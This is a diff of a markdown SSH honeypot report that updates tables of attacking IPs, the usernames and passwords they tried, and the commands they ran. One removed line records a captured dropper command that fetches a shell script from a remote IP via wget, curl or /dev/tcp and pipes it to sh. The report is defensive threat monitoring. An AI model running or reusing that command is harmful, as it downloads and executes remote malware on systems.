@@ -13,51 +13,53 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 24.199.85.200 | 7925 |
-| 47.99.47.102 | 4563 |
-| 120.25.100.12 | 4357 |
-| 8.218.186.25 | 4197 |
-| 47.242.12.97 | 2270 |
-| 47.242.249.133 | 673 |
-| 8.130.102.128 | 445 |
-| 34.86.128.60 | 217 |
-| 8.138.147.140 | 104 |
-| 47.238.193.69 | 90 |
+| 120.55.180.31 | 15607 |
+| 8.217.45.128 | 4804 |
+| 47.92.138.212 | 4451 |
+| 121.40.26.87 | 4380 |
+| 47.83.19.179 | 4201 |
+| 47.242.12.97 | 491 |
+| 39.105.113.134 | 245 |
+| 116.162.221.180 | 159 |
+| 182.92.184.221 | 159 |
+| 222.219.132.221 | 159 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 3555 |
-| ubuntu | 43 |
-| admin | 41 |
-| test | 40 |
-| oracle | 26 |
-| postgres | 24 |
-| ubuntuserver | 22 |
-| ftpuser | 19 |
-| guest | 18 |
-| debian | 16 |
+| root | 1707 |
+| sam | 512 |
+| sandeep | 510 |
+| toor | 509 |
+| apache | 508 |
+| testing | 508 |
+| william | 508 |
+| deploy | 507 |
+| gitlab | 507 |
+| centos | 506 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 1479 |
-| 111111 | 124 |
-| 123 | 38 |
-| password | 34 |
-| 1234 | 32 |
-| test | 17 |
-| 1 | 17 |
-| nagios | 15 |
-| P@ssw0rd | 15 |
-| zarah | 13 |
+| 123456 | 451 |
+| prasun | 21 |
+| mojymiri | 21 |
+| mafi | 21 |
+| eta | 21 |
+| devanshi2 | 21 |
+| casangjo | 21 |
+| avella | 21 |
+| amirfma | 21 |
+| amey | 21 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 34.86.128.60 | uname -s -m |
-| 87.120.113.231 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
+| 140.246.64.72 | uname -s -m |
+| 116.162.221.180 | uname -s -m |
+| 222.219.132.221 | uname -s -m |
 | 47.251.99.255 | uname -s -m |
+| 182.92.184.221 | uname -s -m |
